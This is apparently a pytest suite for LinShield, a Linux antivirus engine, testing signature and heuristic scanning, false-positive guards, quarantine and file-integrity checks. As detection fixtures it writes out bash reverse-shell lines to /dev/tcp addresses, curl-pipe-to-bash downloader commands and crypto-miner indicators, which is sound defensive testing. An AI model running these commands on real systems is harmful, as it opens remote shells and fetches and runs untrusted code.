"""Core engine tests for LinShield.

Every test runs against an :class:`Engine` rooted in a throwaway ``tmp_path`` so
no developer machine state is touched. The EICAR test string is used as a known
"malicious" sample — it is the industry-standard, completely harmless AV probe.
"""

from __future__ import annotations

import stat
from pathlib import Path

import pytest

from linshield.core import Engine
from linshield.core.config import Paths
from linshield.core.hashing import sha256_bytes, sha256_file
from linshield.core.models import Verdict

# Official EICAR anti-malware test string (harmless).
EICAR = (
    r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
).encode("ascii")


@pytest.fixture()
def engine(tmp_path: Path) -> Engine:
    """An Engine isolated to a temporary config/data root."""
    paths = Paths(config_dir=tmp_path / "config", data_dir=tmp_path / "data")
    eng = Engine(paths=paths)
    yield eng
    eng.close()


# --------------------------------------------------------------------------
# hashing
# --------------------------------------------------------------------------
def test_sha256_bytes_matches_file(tmp_path: Path) -> None:
    target = tmp_path / "sample.bin"
    target.write_bytes(b"linshield")
    assert sha256_file(target) == sha256_bytes(b"linshield")
    assert len(sha256_file(target)) == 64


# --------------------------------------------------------------------------
# signature store
# --------------------------------------------------------------------------
def test_eicar_signature_seeded(engine: Engine) -> None:
    """The hash database ships with the EICAR signature pre-seeded."""
    assert engine.signatures.hash_count >= 1
    match = engine.signatures.match_hash(sha256_bytes(EICAR))
    assert match is not None
    assert "EICAR" in match["name"]


def test_add_custom_hash_signature(engine: Engine) -> None:
    digest = sha256_bytes(b"totally-not-a-virus")
    before = engine.signatures.hash_count
    engine.add_hash_signature(digest, "Test.Custom.Sig", "high")
    assert engine.signatures.hash_count == before + 1
    match = engine.signatures.match_hash(digest)
    assert match is not None and match["name"] == "Test.Custom.Sig"


# --------------------------------------------------------------------------
# scanning
# --------------------------------------------------------------------------
def test_scan_detects_eicar(engine: Engine, tmp_path: Path) -> None:
    sample = tmp_path / "eicar.com"
    sample.write_bytes(EICAR)
    summary = engine.scan([str(sample)], scan_type="custom")
    assert summary.infected >= 1
    assert any(d.verdict is Verdict.INFECTED for d in summary.detections)


def test_scan_clean_file_is_clean(engine: Engine, tmp_path: Path) -> None:
    benign = tmp_path / "notes.txt"
    benign.write_text("just some harmless notes\n")
    summary = engine.scan([str(benign)], scan_type="custom")
    assert summary.infected == 0


def test_scan_records_history(engine: Engine, tmp_path: Path) -> None:
    benign = tmp_path / "a.txt"
    benign.write_text("hello")
    engine.scan([str(benign)], scan_type="custom")
    assert engine.db.counts()["scans"] >= 1


def test_heuristic_flags_downloader_script(engine: Engine, tmp_path: Path) -> None:
    evil = tmp_path / "setup.sh"
    evil.write_text("#!/bin/sh\ncurl http://x/y | bash\n")
    summary = engine.scan([str(evil)], scan_type="custom")
    assert summary.infected + summary.suspicious >= 1


# --------------------------------------------------------------------------
# false-positive regression guards (see GUI report: binaries / docs over-flagged)
# --------------------------------------------------------------------------
def test_binary_not_flagged_by_shell_rules(engine: Engine, tmp_path: Path) -> None:
    """A PE/ZIP binary containing the bytes 'curl'/'|sh' must NOT be infected."""
    exe = tmp_path / "Setup.exe"
    exe.write_bytes(b"MZ\x90\x00" + b"curl wget | sh | bash " * 4000)
    apk = tmp_path / "app.apk"
    apk.write_bytes(b"PK\x03\x04" + b"curl ... | bash " * 4000)
    summary = engine.scan([str(exe), str(apk)], scan_type="custom")
    assert summary.infected == 0


def test_markdown_doc_not_flagged(engine: Engine, tmp_path: Path) -> None:
    """A README documenting a 'curl | bash' install is not malware."""
    readme = tmp_path / "README.md"
    readme.write_text("# Install\n\n    curl -fsSL https://example.com/i.sh | bash\n")
    summary = engine.scan([str(readme)], scan_type="custom")
    assert summary.infected == 0
    assert summary.suspicious == 0


def test_html_not_flagged_as_cron(engine: Engine, tmp_path: Path) -> None:
    page = tmp_path / "schedule.html"
    page.write_text("<table><tr><td>0 5 * * * root /usr/bin/backup</td></tr></table>")
    summary = engine.scan([str(page)], scan_type="custom")
    assert summary.infected == 0


def test_installer_script_is_hint_not_conviction(engine: Engine, tmp_path: Path) -> None:
    """An actual curl|bash installer script is a SUSPICIOUS hint, not INFECTED."""
    script = tmp_path / "install.sh"
    script.write_text("#!/bin/bash\ncurl -fsSL http://host/p | bash\n")
    summary = engine.scan([str(script)], scan_type="custom")
    assert summary.infected == 0
    assert summary.suspicious >= 1


def test_reverse_shell_still_infected(engine: Engine, tmp_path: Path) -> None:
    """High-confidence threats must remain INFECTED after the precision tuning."""
    script = tmp_path / "backdoor.sh"
    script.write_text("#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    summary = engine.scan([str(script)], scan_type="custom")
    assert summary.infected >= 1


def test_yara_rule_files_not_self_flagged(engine: Engine, tmp_path: Path) -> None:
    """A .yar file full of malware indicators must not be flagged (it's data)."""
    rule = tmp_path / "myrules.yar"
    rule.write_text(
        'rule R { strings: $s = "stratum+tcp://" $x = "xmrig" '
        '$d = "/dev/tcp/1.2.3.4/9" condition: any of them }'
    )
    summary = engine.scan([str(rule)], scan_type="custom")
    assert summary.infected == 0
    assert summary.suspicious == 0


def test_linshield_own_dirs_excluded(engine: Engine) -> None:
    """LinShield's own storage is never scanned (would self-flag rule packs)."""
    # Drop an EICAR file straight into the data dir; scanning that dir must skip it.
    planted = engine.paths.data_dir / "planted_eicar.com"
    planted.write_bytes(EICAR)
    summary = engine.scan([str(engine.paths.data_dir)], scan_type="custom")
    assert summary.infected == 0
    assert summary.files_scanned == 0  # entire tree excluded


def test_archive_scanning_toggle(tmp_path: Path) -> None:
    import zipfile

    from linshield.core.scanner import Scanner

    paths = Paths(config_dir=tmp_path / "c", data_dir=tmp_path / "d")
    eng = Engine(paths=paths)
    try:
        bundle = tmp_path / "bundle.zip"
        with zipfile.ZipFile(bundle, "w") as zf:
            zf.writestr("nested/evil.com", EICAR)

        # Off: the member is not inspected (the archive itself may still match,
        # so assert specifically that no *member* path is reported).
        eng.config.scan_archives = False
        eng.scanner = Scanner(eng.config, eng.signatures)
        s1 = eng.scan([str(bundle)], scan_type="custom")
        assert not any("!" in d.path for d in s1.detections)

        # On: the EICAR member is found and reported with an archive path.
        eng.config.scan_archives = True
        eng.scanner = Scanner(eng.config, eng.signatures)
        s2 = eng.scan([str(bundle)], scan_type="custom")
        assert any("!" in d.path and d.verdict.value == "infected" for d in s2.detections)
    finally:
        eng.close()


def test_firewall_status_never_crashes() -> None:
    from linshield.core import firewall

    st = firewall.status()
    assert st.backend  # always a string, even "none"
    assert isinstance(st.active, bool)


def test_own_source_files_not_flagged(engine: Engine, tmp_path: Path) -> None:
    """A file carrying the LinShield self-exclusion sentinel is never flagged,
    even though it contains malware-indicator strings (its own patterns)."""
    marker = b"LS-SELF-EXCLUDE-7f3a9c2e1b"
    fake_source = tmp_path / "heuristics_copy.py"
    fake_source.write_bytes(
        b"# " + marker + b"\n"
        b'PATTERN = "curl http://x | bash"\n'
        b'REV = "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"\n'
        b'MINER = "stratum+tcp:// xmrig randomx"\n'
    )
    summary = engine.scan([str(fake_source)], scan_type="custom")
    assert summary.infected == 0
    assert summary.suspicious == 0

    # A near-identical file WITHOUT the marker is still flagged (guard is precise).
    real = tmp_path / "real.sh"
    real.write_text("#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")
    s2 = engine.scan([str(real)], scan_type="custom")
    assert s2.infected >= 1


# --------------------------------------------------------------------------
# quarantine
# --------------------------------------------------------------------------
def test_quarantine_isolate_and_restore(engine: Engine, tmp_path: Path) -> None:
    sample = tmp_path / "eicar.com"
    sample.write_bytes(EICAR)
    summary = engine.scan([str(sample)], scan_type="custom", auto_quarantine=True)
    assert summary.auto_quarantined >= 1
    assert not sample.exists()  # moved into the vault

    entries = engine.quarantine.list()
    assert len(entries) == 1
    qid = entries[0].qid

    restored = engine.quarantine.restore(qid)
    assert Path(restored).exists()
    assert engine.db.counts()["quarantine"] == 0  # no longer active


def test_quarantine_delete(engine: Engine, tmp_path: Path) -> None:
    sample = tmp_path / "eicar.com"
    sample.write_bytes(EICAR)
    engine.scan([str(sample)], scan_type="custom", auto_quarantine=True)
    qid = engine.quarantine.list()[0].qid
    engine.quarantine.delete(qid)
    assert engine.quarantine.list() == []


def test_quarantine_vault_is_private(engine: Engine) -> None:
    mode = stat.S_IMODE(engine.paths.quarantine_dir.stat().st_mode)
    # No group/other access on the vault directory.
    assert mode & 0o077 == 0


# --------------------------------------------------------------------------
# FIM
# --------------------------------------------------------------------------
def test_fim_baseline_and_check(engine: Engine, tmp_path: Path) -> None:
    watched = tmp_path / "watched.conf"
    watched.write_text("setting=1\n")
    engine.config.fim_paths = [str(watched)]

    count = engine.fim_init()
    assert count >= 1

    # Unchanged -> no findings beyond an informational "all clear".
    findings = engine.fim_check()
    assert all(f.severity.value == "info" for f in findings) or findings == []

    # Tamper with the file -> a change must be reported.
    watched.write_text("setting=666\n")
    changed = engine.fim_check()
    assert any(
        "watched.conf" in (f.title + " " + (f.detail or "")) for f in changed
    )


# --------------------------------------------------------------------------
# status / config
# --------------------------------------------------------------------------
def test_status_shape(engine: Engine) -> None:
    st = engine.status()
    for key in ("version", "engines", "counts", "firewall", "config"):
        assert key in st
    assert "hashes" in st["engines"]


def test_config_roundtrip(engine: Engine) -> None:
    engine.config.max_file_size_mb = 99
    engine.save_config()
    reloaded = Engine(paths=engine.paths)
    try:
        assert reloaded.config.max_file_size_mb == 99
    finally:
        reloaded.close()


def test_trusted_path_allowlist(engine: Engine, tmp_path: Path) -> None:
    """A trusted path is never scanned/flagged; identical files elsewhere are."""
    from linshield.core.scanner import Scanner

    trusted = tmp_path / "tools"
    trusted.mkdir()
    (trusted / "rev.sh").write_text("#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")
    other = tmp_path / "other"
    other.mkdir()
    (other / "rev.sh").write_text("#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")

    engine.config.trusted_paths = [str(trusted)]
    engine.scanner = Scanner(engine.config, engine.signatures)
    summary = engine.scan([str(trusted), str(other)], scan_type="custom")

    assert summary.files_scanned == 1  # trusted tree skipped entirely
    assert all(str(trusted) not in d.path for d in summary.detections)
    assert any(str(other) in d.path for d in summary.detections)


# --------------------------------------------------------------------------
# confidence tiers (anti-false-positive-panic model)
# --------------------------------------------------------------------------
def test_hash_match_is_confirmed(engine: Engine, tmp_path: Path) -> None:
    from linshield.core.models import Confidence

    f = tmp_path / "eicar.com"
    f.write_bytes(EICAR)
    summary = engine.scan([str(f)], scan_type="custom", auto_quarantine=False)
    assert summary.confirmed >= 1
    assert all(d.confidence is Confidence.CONFIRMED for d in summary.detections)


def test_lone_downloader_idiom_is_review_not_confirmed(engine: Engine, tmp_path: Path) -> None:
    """A curl|bash installer — the classic false positive — must be REVIEW."""
    from linshield.core.models import Confidence

    f = tmp_path / "install.sh"
    f.write_text("#!/bin/bash\ncurl -fsSL http://host/x | bash\n")
    summary = engine.scan([str(f)], scan_type="custom", auto_quarantine=False)
    assert summary.confirmed == 0
    assert summary.review >= 1
    assert all(d.confidence is Confidence.REVIEW for d in summary.detections)


def test_reverse_shell_is_at_least_likely(engine: Engine, tmp_path: Path) -> None:
    from linshield.core.models import Confidence

    f = tmp_path / "rev.sh"
    f.write_text("#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")
    summary = engine.scan([str(f)], scan_type="custom", auto_quarantine=False)
    tiers = {d.confidence for d in summary.detections}
    assert Confidence.LIKELY in tiers or Confidence.CONFIRMED in tiers


def test_autoquarantine_only_confirmed(engine: Engine, tmp_path: Path) -> None:
    """Review/likely-tier files are never auto-quarantined — only confirmed."""
    (tmp_path / "eicar.com").write_bytes(EICAR)                       # confirmed
    (tmp_path / "install.sh").write_text("#!/bin/bash\ncurl http://h|bash\n")  # review
    summary = engine.scan([str(tmp_path)], scan_type="custom", auto_quarantine=True)
    assert summary.auto_quarantined == 1  # only the EICAR file
    assert (tmp_path / "install.sh").exists()  # the review-tier file left alone


# --------------------------------------------------------------------------
# code-review fixes (v1.0.8)
# --------------------------------------------------------------------------
def test_fim_detects_ownership_change(engine: Engine, tmp_path: Path) -> None:
    from linshield.core import integrity

    watched = tmp_path / "w"
    watched.mkdir()
    (watched / "bin").write_text("orig")
    integrity.build_baseline(engine.db, [str(watched)])
    # Simulate a different owner in the baseline (chown needs root).
    engine.db._conn.execute("UPDATE fim_baseline SET uid = uid + 4242")
    engine.db._conn.commit()
    findings = integrity.check_integrity(engine.db, [str(watched)])
    assert any("Ownership changed" in f.title for f in findings)


def test_rootkit_paths_expanded_and_checks_present() -> None:
    from linshield.core import rootkit

    assert len(rootkit._KNOWN_ROOTKIT_PATHS) >= 40
    assert hasattr(rootkit, "_check_deleted_exe_processes")
    assert hasattr(rootkit, "_check_kernel_taint")
    # run_checks must not raise and must always return findings.
    assert rootkit.run_checks()


def test_import_hashes_csv_and_plain(engine: Engine, tmp_path: Path) -> None:
    feed = tmp_path / "feed.csv"
    feed.write_text(
        "# header comment\n"
        '"2024","deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef","elf","Mirai"\n'
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,Trojan.Test\n"
        "44d88612fea8a8f36de82e1278abb02f\n"   # md5 (32 hex) — ignored
        "garbage line\n"
    )
    result = engine.import_hashes(str(feed))
    assert result["added"] == 2
    assert engine.signatures.match_hash(
        "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
    ) is not None


def test_realtime_auto_quarantine_defaults_false() -> None:
    from linshield.core.config import Config

    c = Config()
    assert c.auto_quarantine is False
    assert c.realtime_auto_quarantine is False  # consistent conservative posture


def test_nested_archive_recursion(tmp_path: Path) -> None:
    import io
    import zipfile

    from linshield.core.config import Paths
    from linshield.core.scanner import Scanner

    eng = Engine(paths=Paths(config_dir=tmp_path / "c", data_dir=tmp_path / "d"))
    try:
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w") as z:
            z.writestr("evil.com", EICAR)
        outer = tmp_path / "outer.zip"
        with zipfile.ZipFile(outer, "w") as z:
            z.writestr("nested.zip", inner.getvalue())
        eng.config.scan_archives = True
        eng.scanner = Scanner(eng.config, eng.signatures)
        s = eng.scan([str(outer)], scan_type="custom", auto_quarantine=False)
        assert any("nested.zip!" in d.path for d in s.detections)
    finally:
        eng.close()
